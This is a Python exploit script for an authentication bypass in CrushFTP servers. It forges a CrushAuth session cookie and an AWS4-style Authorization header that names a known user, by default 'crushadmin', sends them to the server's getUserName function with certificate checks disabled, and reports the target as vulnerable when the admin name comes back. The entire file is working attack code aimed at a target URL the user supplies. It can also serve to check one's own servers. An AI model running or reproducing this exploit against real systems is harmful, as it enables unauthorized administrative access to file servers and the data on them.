import time
import requests
import argparse
from random import choice
from urllib.parse import urlparse


class CrushFTPAuthBypassExploit:
    def __init__(self, target_url, valid_username):
        """
        Initialize the exploit for CrushFTP
        
        :param target_url: The CrushFTP server endpoint
        :param valid_username: A valid CrushFTP username to exploit
        """
        self.target_url = target_url
        self.username = valid_username

    def exploit(self):
        """
        Attempt to exploit the CrushFTP authentication bypass
        
        :return: Response details
        """
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        crushAuth = str(int(time.time())) + "_" + "".join([choice(chars) for _ in range(30)])
        currentAuth = crushAuth[-4:]
        cookies = {"CrushAuth": crushAuth, "currentAuth": currentAuth}
        headers = {
            'Authorization': f"AWS4-HMAC-SHA256 Credential={self.username}/",
            'Host': urlparse(self.target_url).hostname,
        }
        
        # Attempt to access a protected resource
        target_url = f"{self.target_url}/WebInterface/function/?command=getUserName&format=JSONOBJ&c2f=" + currentAuth
        try:
            response = requests.post(target_url, headers=headers,cookies=cookies, verify=False)
            return {
                'status_code': response.status_code,
                'response_text': response.text,
            }
        except Exception as e:
            return {
                'error': str(e)
            }



if __name__ == "__main__":
    print("https://www.pwnfuzz.com")
    # Set up argument parsing for target URL and username
    parser = argparse.ArgumentParser(description="Run the CrushFTP authentication bypass exploit.")
    parser.add_argument('target_url', type=str, help="Target URL of the CrushFTP server (e.g., http://localhost:8080)")
    parser.add_argument('--valid_username', type=str, default="crushadmin", help="A known valid username on the target system (default: crushadmin)")

    # Parse arguments
    args = parser.parse_args()
    
    # Run the exploit with the provided arguments
    exploit = CrushFTPAuthBypassExploit(
    target_url=args.target_url,
    valid_username=args.valid_username
    )
    
    print("[*] CrushFTP Authentication Bypass Exploit")
    print(f"[*] Targeting: {args.target_url}")
    print(f"[*] Using username: {args.valid_username}")
    
    result = exploit.exploit()
    if "crushadmin" in result['response_text']:
        print("[+] CrushFTP Server is Vulnerable!")
        print("[+] Exploit Result:\n")
        for key, value in result.items():
            print(f"{key.title()}: {value}")
    else:
        print("[!] Not Vulnerable!")